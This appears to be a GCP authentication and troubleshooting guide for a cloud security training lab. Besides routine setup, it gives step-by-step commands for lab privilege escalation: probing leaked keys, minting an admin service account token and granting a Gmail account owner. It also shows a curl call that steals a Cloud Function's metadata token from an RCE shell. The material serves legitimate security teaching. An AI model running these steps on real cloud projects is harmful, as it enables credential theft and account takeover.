# GCP Auth

Authentication setup and service account troubleshooting for deploying and running the labs.

---

## Deployer authentication

Terraform uses Application Default Credentials (ADC) to authenticate with GCP.

### Set up ADC

```bash
gcloud auth application-default login
```

This opens a browser and writes credentials to `~/.config/gcloud/application_default_credentials.json`. Terraform picks them up automatically.

### Switch active project

```bash
gcloud config set project <PROJECT_ID>
```

This sets the default project for `gcloud` commands but does not affect Terraform — Terraform reads `var.project_id` from tfvars.

### Verify ADC is working

```bash
gcloud auth application-default print-access-token
```

If this returns a token, ADC is configured. If it errors, re-run `gcloud auth application-default login`.

---

## Required roles for `setup.sh`

`scripts/setup.sh` creates projects, links billing, and creates a GCS bucket. The active gcloud account needs:

| Scope | Role |
|-------|------|
| Organization or folder (if using `--org-id` / `--folder-id`) | `roles/resourcemanager.projectCreator` |
| Account level (personal GCP accounts with no org) | Project Creator is implicit |
| Billing account | `roles/billing.user` |
| Project A (auto-granted as project creator) | `roles/owner` |

After `setup.sh` runs, your account is automatically project owner on all three projects via the creation grant. No additional binding is needed before running `deploy-chain.sh apply`.

---

## Multi-project authentication

The lab chain uses three GCP projects. The deployer's identity must have the required roles on **all three projects** before running `terraform apply`.

### Check your roles on a project

```bash
gcloud projects get-iam-policy <PROJECT_ID> \
  --flatten="bindings[].members" \
  --filter="bindings.members:user:<YOUR_EMAIL>" \
  --format="table(bindings.role)"
```

### Grant roles (requires `resourcemanager.projects.setIamPolicy`)

```bash
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member="user:<YOUR_EMAIL>" \
  --role="roles/editor"
```

See [README.md](../README.md) for the full list of required roles.

---

## Service account keys (learner credentials)

After deploying lab-01-gsc-privesc, generate a SA key to hand to the learner as their starting credential:

```bash
gcloud iam service-accounts keys create sa-key.json \
  --iam-account=$(cd labs/lab-01-gsc-privesc && terraform output -raw training_sa_email) \
  --project=<PROJECT_A_ID>
```

The `terraform output sa_key_create_command` shortcut also prints this command after apply.

> SA keys are sensitive. Do not commit `sa-key.json` to the repository.

### Authenticate as a service account (for testing)

```bash
gcloud auth activate-service-account --key-file=sa-key.json
gcloud config set project <PROJECT_ID>
gcloud storage ls gs://<BUCKET_NAME>
```

### Revoke SA authentication and return to ADC

```bash
gcloud config set account <YOUR_USER_EMAIL>
gcloud auth application-default login
```

---

## Troubleshooting

### `Error 403: Permission denied`

The ADC identity lacks a required role on the project. Check with:

```bash
gcloud projects get-iam-policy <PROJECT_ID> \
  --flatten="bindings[].members" \
  --filter="bindings.members:user:<YOUR_EMAIL>" \
  --format="table(bindings.role)"
```

### `Error: Unable to generate an access token`

ADC token has expired. Re-run `gcloud auth application-default login`.

### `Error: googleapi: Error 409: Already exists`

A resource with that name already exists in GCP. Common causes:
- Cloud SQL instance name reuse — instance deletion schedules a 7-day hold on the name
- KMS key ring reuse — key rings are permanent; the name can conflict on re-apply with the same UID

Fix: destroy cleanly and allow the random UID to change on the next `terraform init` (which re-creates `random_id.deployment`).

### `Error: Error creating Service Account: googleapi: Error 409`

The service account already exists (perhaps from a previous failed destroy). Import it:

```bash
terraform import google_service_account.<name> projects/<PROJECT_ID>/serviceAccounts/<EMAIL>
```

### Service account impersonation via Token Creator (lab-03)

Lab-03 Stage 2 requires generating an access token for `admin-owner` SA using the `token-generator` credential.

**Step 1 — Activate each credential and probe for the valid one**

```bash
# Iterate through the 10 keys in service-accounts.json.
# The valid one (position 5) can list service accounts; the rest get 403.
gcloud auth activate-service-account --key-file=<KEY_N>.json
gcloud iam service-accounts list --project=<ADMIN_PROJECT_ID>
```

Only the `token-generator` key succeeds. Note its email from the output.

**Step 2 — Generate an access token for admin-owner SA**

```bash
# While authenticated as token-generator:
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<ADMIN_OWNER_EMAIL>:generateAccessToken" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'
```

Copy the returned `accessToken` value.

**Step 3 — Use the token with gcloud**

```bash
gcloud config set auth/access_token <ADMIN_OWNER_ACCESS_TOKEN>
# Verify — should return admin-owner SA bindings:
gcloud projects get-iam-policy <ADMIN_PROJECT_ID>
```

**Step 4 — Grant personal Gmail account roles/owner (Stage 3)**

```bash
gcloud projects add-iam-policy-binding <ADMIN_PROJECT_ID> \
  --member="user:<YOUR_GMAIL>" \
  --role="roles/owner"
# This uses admin-owner's projectIamAdmin role.
# Note: admin-owner cannot enable APIs (role excludes serviceusage.services.enable).
```

**Step 5 — Read the flag secret (Stage 5)**

After enabling the Secret Manager API via the GCP Console (Stage 4):

```bash
# Still using the admin-owner access token:
gcloud secrets versions access latest \
  --secret=<DEPLOYMENT_UID>-admin-flag \
  --project=<ADMIN_PROJECT_ID>
```

> In org deployments (`enable_deny_policies = true`), the `flag_secret_guard` Deny Policy blocks the Gmail project owner from reading the secret. The `admin-owner` SA token is the only identity that succeeds.

> Access tokens expire after ~1 hour. Regenerate using Step 2 if commands return 401.

---

### Metadata token inside the Cloud Function (lab-02)

To steal the Cloud Function's runtime SA token from within the RCE shell:

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Use the returned `access_token` with the GCP REST API or set it in `gcloud`:

```bash
gcloud config set auth/access_token <TOKEN>
gcloud projects get-iam-policy <WEBAPP_PROJECT_ID>
```

> Metadata tokens expire after ~1 hour. If commands start returning 401, steal a fresh token.
